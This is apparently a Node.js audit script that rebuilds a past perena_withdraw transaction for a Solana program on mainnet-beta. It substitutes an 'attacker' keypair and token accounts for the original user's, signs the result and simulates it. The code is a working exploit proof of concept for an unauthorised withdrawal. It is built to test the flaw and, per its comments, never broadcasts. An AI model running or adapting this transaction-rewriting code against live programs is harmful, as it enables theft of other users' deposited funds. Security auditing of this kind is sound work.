#!/usr/bin/env node
'use strict';
// Read-only mainnet-beta outsider mutation; this script has no send method.
// The local signer is loaded only at runtime. Never log the keypair or RPC URL.
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const modules = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, VersionedTransaction} = require(modules + '@solana/web3.js');
const {getAssociatedTokenAddressSync, createAssociatedTokenAccountIdempotentInstruction} = require(modules + '@solana/spl-token');
const bs58mod = require(modules + 'bs58');
const bs58 = bs58mod.default || bs58mod;
const DIR = __dirname;
const PROGRAM = '8ybMhmtJb1VS6cqV4bPapvEUCRg3EGGrjpNhkLBPezA7';
const HISTORICAL = '4bShjuw3Xhc76sgXF2SYLFSm9s8C4n2K4bmNZSURLawUa2fbADV1V6UMbJPaPhvAoiJAFZbLoxC4yiKNFGwcTzw8';
const idl = JSON.parse(fs.readFileSync(path.join(DIR, '8yb-onchain-idl.json'), 'utf8'));
const instruction = idl.instructions.find(i => i.name === 'perena_withdraw');
if (!instruction) throw Error('Perena withdraw missing from current IDL');
const secret = JSON.parse(fs.readFileSync('/Users/stacc/hooked.json', 'utf8'));
if (!Array.isArray(secret) || secret.length !== 64 || !secret.every(x => Number.isInteger(x) && x >= 0 && x <= 255))
  throw Error('hooked keypair invalid');
const signer = Keypair.fromSecretKey(Uint8Array.from(secret));
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env', 'utf8')
  .split('\n').filter(x => x.includes('=')).map(x => x.split(/=(.*)/s).slice(0, 2)));
const url = env.HEAVY_RPC_URL || env.RPC_URL;
if (!url) throw Error('RPC unavailable');
let requestId = 0;
async function rpc(method, params) {
  if (!['getTransaction', 'getMultipleAccounts', 'getBalance', 'getLatestBlockhash', 'simulateTransaction'].includes(method))
    throw Error('RPC method not allowlisted');
  const r = await fetch(url, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++requestId, method, params})});
  const j = await r.json();
  if (!r.ok || j.error) throw Error(`${method} failed: ${j.error?.code || r.status} ${j.error?.message || ''}`);
  return j.result;
}
function assert(condition, label) { if (!condition) throw Error(`Validation failed: ${label}`); }
function pk(x) { return new PublicKey(x); }
function data(info) { return info ? Buffer.from(info.data[0], 'base64') : null; }
function mintInfo(address, info) {
  if (!info) return {address, exists: false};
  const b = data(info);
  const authorityOption = b.readUInt32LE(0);
  return {address, exists: true, owner: info.owner, mintAuthority: authorityOption ? new PublicKey(b.subarray(4, 36)).toBase58() : null,
    supplyRaw: b.readBigUInt64LE(36).toString(), decimals: b[44], freezeAuthority: b.readUInt32LE(46) ? new PublicKey(b.subarray(50, 82)).toBase58() : null};
}
function tokenInfo(address, info) {
  if (!info) return {address, exists: false};
  const b = data(info);
  return {address, exists: true, program: info.owner, mint: new PublicKey(b.subarray(0, 32)).toBase58(),
    authority: new PublicKey(b.subarray(32, 64)).toBase58(), amountRaw: b.readBigUInt64LE(64).toString()};
}
function ata(mint, owner, tokenProgram) {
  return getAssociatedTokenAddressSync(pk(mint), pk(owner), true, pk(tokenProgram)).toBase58();
}
async function main() {
  const historical = await rpc('getTransaction', [HISTORICAL, {encoding: 'jsonParsed', maxSupportedTransactionVersion: 1, commitment: 'confirmed'}]);
  assert(historical && historical.meta.err === null, 'historical exit success');
  const route = historical.transaction.message.instructions.find(i => i.programId === PROGRAM);
  assert(route && Array.isArray(route.accounts), 'historical 8yb instruction');
  assert(route.accounts.length === 31, 'historical extra accounts preserved');
  const old = route.accounts;
  const ixData = Buffer.from(bs58.decode(route.data));
  assert(ixData.length >= 56 && ixData.subarray(0, 8).equals(Buffer.from(instruction.discriminator)), 'published discriminator and minimum data shape');
  const vaultId = new PublicKey(ixData.subarray(8, 40)).toBase58();
  const lpAmountRaw = ixData.readBigUInt64LE(40).toString();
  // Current successful payload has 30 more bytes than the published IDL shape.
  // Keep every byte intact; the extra layout is not safely decoded here.
  const vault = PublicKey.findProgramAddressSync([Buffer.from('vault'), pk(vaultId).toBuffer()], pk(PROGRAM))[0].toBase58();
  assert(old[7] === vault, 'vault PDA');
  assert(old[2] === ata(old[1], old[0], old[17]), 'historical signer output ATA');
  assert(old[3] === ata(old[1], old[7], old[17]), 'vault output ATA');
  assert(old[4] === ata(old[8], old[7], old[19]), 'vault external ATA');
  assert(old[6] === ata(old[5], old[0], old[18]), 'historical signer receipt ATA');
  assert(old[15] === 'save8RQVPMWNTzU18t3GBvBkN9hT7jsGjiCQ28FpD9H', 'Perena program');
  const map = new Map(historical.transaction.message.accountKeys.map(x => [x.pubkey, x]));
  assert(map.get(old[0])?.signer && !old.slice(1).some(x => map.get(x)?.signer), 'only historical user signs route');
  const newOutput = ata(old[1], signer.publicKey.toBase58(), old[17]);
  const newReceipt = ata(old[5], signer.publicKey.toBase58(), old[18]);
  const watched = [signer.publicKey.toBase58(), old[1], old[2], old[3], old[4], old[5], old[6], old[7], old[8], newOutput, newReceipt];
  const current = await rpc('getMultipleAccounts', [watched, {encoding: 'base64', commitment: 'confirmed'}]);
  const state = new Map(watched.map((x, i) => [x, current.value[i]]));
  const vaultData = data(state.get(vault));
  assert(state.get(vault)?.owner === PROGRAM && vaultData.length >= 137, 'current controller vault owner and length');
  assert(vaultData.subarray(0, 8).equals(Buffer.from(idl.accounts.find(a => a.name === 'Vault').discriminator)), 'vault discriminator');
  const vaultFields = {
    vaultId: new PublicKey(vaultData.subarray(8, 40)).toBase58(),
    token: new PublicKey(vaultData.subarray(40, 72)).toBase58(),
    internalLp: new PublicKey(vaultData.subarray(72, 104)).toBase58(),
    externalLp: new PublicKey(vaultData.subarray(104, 136)).toBase58(),
    bump: vaultData[136],
  };
  assert(vaultFields.vaultId === vaultId && vaultFields.token === old[1] && vaultFields.internalLp === old[5] && vaultFields.externalLp === old[8], 'vault stored mint bindings');
  const receiptMint = mintInfo(old[5], state.get(old[5]));
  const outputMint = mintInfo(old[1], state.get(old[1]));
  const externalMint = mintInfo(old[8], state.get(old[8]));
  assert(receiptMint.owner === old[18] && outputMint.owner === old[17] && externalMint.owner === old[19], 'mint token program bindings');
  assert(receiptMint.mintAuthority === vault, 'receipt mint authority is controller vault');
  const oldReceipt = tokenInfo(old[6], state.get(old[6]));
  const oldOutput = tokenInfo(old[2], state.get(old[2]));
  const attackerReceipt = tokenInfo(newReceipt, state.get(newReceipt));
  const attackerOutput = tokenInfo(newOutput, state.get(newOutput));
  const vaultOutput = tokenInfo(old[3], state.get(old[3]));
  const vaultExternal = tokenInfo(old[4], state.get(old[4]));
  for (const [label, x, expectedMint, expectedAuthority, expectedProgram] of [
    ['vault output', vaultOutput, old[1], vault, old[17]],
    ['vault external', vaultExternal, old[8], vault, old[19]],
  ]) assert(x.exists && x.mint === expectedMint && x.authority === expectedAuthority && x.program === expectedProgram, `${label} token ownership`);
  if (oldReceipt.exists) assert(oldReceipt.mint === old[5] && oldReceipt.authority === old[0] && oldReceipt.program === old[18], 'historical receipt ownership now');
  if (oldOutput.exists) assert(oldOutput.mint === old[1] && oldOutput.authority === old[0] && oldOutput.program === old[17], 'historical output ownership now');
  if (attackerReceipt.exists) assert(attackerReceipt.mint === old[5] && attackerReceipt.authority === signer.publicKey.toBase58() && attackerReceipt.program === old[18], 'attacker receipt ownership');
  if (attackerOutput.exists) assert(attackerOutput.mint === old[1] && attackerOutput.authority === signer.publicKey.toBase58() && attackerOutput.program === old[17], 'attacker output ownership');
  const balance = await rpc('getBalance', [signer.publicKey.toBase58(), {commitment: 'confirmed'}]);
  assert(balance.value > 10000000, 'fee payer SOL balance');
  const mutData = Buffer.from(ixData);
  const replacements = new Map([[old[0], signer.publicKey.toBase58()], [old[2], newOutput], [old[6], newReceipt]]);
  const keys = old.map(address => ({pubkey: pk(replacements.get(address) || address),
    isSigner: !!map.get(address)?.signer, isWritable: !!map.get(address)?.writable}));
  const attackIx = new TransactionInstruction({programId: pk(PROGRAM), keys, data: mutData});
  const initReceiptAta = process.argv.includes('--init-receipt-ata');
  const instructions = initReceiptAta ? [createAssociatedTokenAccountIdempotentInstruction(
    signer.publicKey, pk(newReceipt), signer.publicKey, pk(old[5]), pk(old[18])), attackIx] : [attackIx];
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const message = new TransactionMessage({payerKey: signer.publicKey, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  const tx = new VersionedTransaction(message);
  tx.sign([signer]);
  const wire = Buffer.from(tx.serialize());
  assert(wire.length <= 1232, 'serialized transaction packet limit');
  const sim = await rpc('simulateTransaction', [wire.toString('base64'), {
    encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false, commitment: 'processed',
    accounts: {encoding: 'base64', addresses: [newOutput, newReceipt, old[3], old[4]]},
  }]);
  const result = {
    generatedAt: new Date().toISOString(), scope: '8yb PerenaWithdraw outsider mutation on mainnet-beta',
    rpcMethod: 'simulateTransaction', sigVerify: true, broadcast: false,
    historicalSignature: HISTORICAL, historicalSlot: historical.slot, currentAccountSlot: current.context.slot,
    simulationSlot: sim.context.slot, program: PROGRAM, signer: signer.publicKey.toBase58(),
    instruction: 'perena_withdraw', accountCount: old.length, instructionDataBytes: mutData.length,
    transactionInstructionCount: instructions.length, receiptAtaInit: initReceiptAta,
    serializedBytes: wire.length, wireSha256: crypto.createHash('sha256').update(wire).digest('hex'),
    vault, vaultFields, lpAmountRaw, publishedIdlDataBytes: 56,
    historicalPayloadBytes: ixData.length, payloadBeyondIdlBytes: ixData.length - 56,
    payloadMutation: 'none',
    outputMint, receiptMint, externalMint, oldReceipt, attackerReceipt, attackerOutput, vaultOutput, vaultExternal,
    walletLamports: balance.value, validations: {
      discriminator: true, vaultPda: true, fourHistoricalAtas: true, vaultStoredMintBindings: true,
      mintProgramOwners: true, vaultTokenAccountOwners: true, onlyUserSigner: true,
      attackerAtaDerivations: true,
    },
    simulation: {err: sim.value.err, unitsConsumed: sim.value.unitsConsumed,
      logs: sim.value.logs, returnData: sim.value.returnData || null,
      postTokenAccounts: sim.value.err ? null : (sim.value.accounts || []).map((x, i) => tokenInfo([newOutput, newReceipt, old[3], old[4]][i], x))},
  };
  const outfile = path.join(DIR, initReceiptAta ? '8yb-perena-outsider-signed-mainnet-with-ata.json' : '8yb-perena-outsider-signed-mainnet.json');
  fs.writeFileSync(outfile, JSON.stringify(result, null, 2) + '\n');
  console.log(JSON.stringify({file: path.basename(outfile), simulationSlot: result.simulationSlot,
    err: result.simulation.err, unitsConsumed: result.simulation.unitsConsumed,
    attackerReceipt: {exists: attackerReceipt.exists, amountRaw: attackerReceipt.amountRaw || null},
    logs: result.simulation.logs?.slice(-12)}));
}
main().catch(e => { console.error(e.stack || String(e)); process.exitCode = 1; });
